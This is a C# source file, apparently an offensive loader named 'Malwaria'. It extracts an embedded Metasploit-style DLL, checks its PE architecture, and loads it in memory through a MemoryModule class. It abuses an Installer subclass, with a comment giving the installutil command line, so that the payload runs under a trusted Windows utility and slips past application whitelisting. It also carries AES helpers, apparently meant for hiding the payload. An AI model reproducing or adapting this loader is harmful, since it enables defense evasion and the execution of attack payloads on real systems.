using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Configuration;


namespace Malwaria
{
  class Program
    {
        public static string peType(byte[] data)
        {
            ushort architecture = 0;
            Stream s = new MemoryStream(data);
            using (System.IO.BinaryReader bReader = new System.IO.BinaryReader(s))
            {
                if (bReader.ReadUInt16() == 23117) //check the MZ signature
                {
                    s.Seek(0x3A, System.IO.SeekOrigin.Current); // seek to e_lfanew.
                    s.Seek(bReader.ReadUInt32(), System.IO.SeekOrigin.Begin); //Seek to the start of the NT header.
                    if (bReader.ReadUInt32() == 17744) // check the PE\0\0 signature.
                    {
                        s.Seek(20, System.IO.SeekOrigin.Current); // seek past the file header, and
                        architecture = bReader.ReadUInt16(); // read the magic number of the optional header.
                    }
                }
                
                if (architecture == 0x10b)
                {
                    return "PE32";
                }
                else if (architecture == 0x20b)
                {
                    return "PE32+";
                }

                
            }
			
            return "Unknown";
        }

        public static byte[] ExtractResource(String filename)
        {
            System.Reflection.Assembly a = System.Reflection.Assembly.GetExecutingAssembly();
            using (Stream resFilestream = a.GetManifestResourceStream(filename))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }

        
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int DllMain12();
        
        public static void Main()
        {
            byte[] exe = ExtractResource("Malwaria.msf.dll");
            //Determine if PE32 or PE32+ 
            
            string pe = peType(exe);
            Console.WriteLine("The resource is a {0} file",pe);

            MemoryModule memModule = new MemoryModule(exe);
                   
            DllMain12 msf = (DllMain12)memModule.GetDelegateFromFuncName("DllMain12", typeof(DllMain12));
                    
        }
    }
    
    //C:\Windows\Microsoft.NET\Framework\v2.0.50727\installutil /LogToConsole=false /logfile= Malwaria.exe
    
    [System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
	    
	    public override void Install(System.Collections.IDictionary savedState)
	    {

	    	Malwaria.Program.Main();
	    	
	    }
	    
	}
    
    
 public class CryptoSupport
	{
	    
	    private static readonly byte[] SALT = new byte[] { 0xba, 0xdc, 0x0f, 0xfe, 0xeb, 0xad, 0xbe, 0xfd, 0xea, 0xdb, 0xab, 0xef, 0xac, 0xe8, 0xac, 0xdc };
	    
	    static byte[] FileToByteArray(string _FileName)
	    {
	        byte[] _Buffer = null;
	        System.IO.FileStream _FileStream = new System.IO.FileStream(_FileName, System.IO.FileMode.Open, System.IO.FileAccess.Read);
	        System.IO.BinaryReader _BinaryReader = new System.IO.BinaryReader(_FileStream);
	        long _TotalBytes = new System.IO.FileInfo(_FileName).Length;
	        _Buffer = _BinaryReader.ReadBytes((Int32)_TotalBytes);
	        _FileStream.Close();
	        _FileStream.Dispose();
	        _BinaryReader.Close();
	        return _Buffer;
	    }
	
	    public static byte[] Encrypt(byte[] plain, string password)
	    {
	        MemoryStream memoryStream;
	        CryptoStream cryptoStream;
	        Rijndael rijndael = Rijndael.Create();
	        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, SALT);
	        rijndael.Key = pdb.GetBytes(32);
	        rijndael.IV = pdb.GetBytes(16);
	        memoryStream = new MemoryStream();
	        cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
	        cryptoStream.Write(plain, 0, plain.Length);
	        cryptoStream.Close();
	        return memoryStream.ToArray();
	    }
	    public static byte[] Decrypt(byte[] cipher, string password)
	    {
	        MemoryStream memoryStream;
	        CryptoStream cryptoStream;
	        Rijndael rijndael = Rijndael.Create();
	        Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, SALT);
	        rijndael.Key = pdb.GetBytes(32);
	        rijndael.IV = pdb.GetBytes(16);
	        memoryStream = new MemoryStream();
	        cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
	        cryptoStream.Write(cipher, 0, cipher.Length);
	        cryptoStream.Close();
	        return memoryStream.ToArray();
	    }
	
	}//End CryptoSupport
}
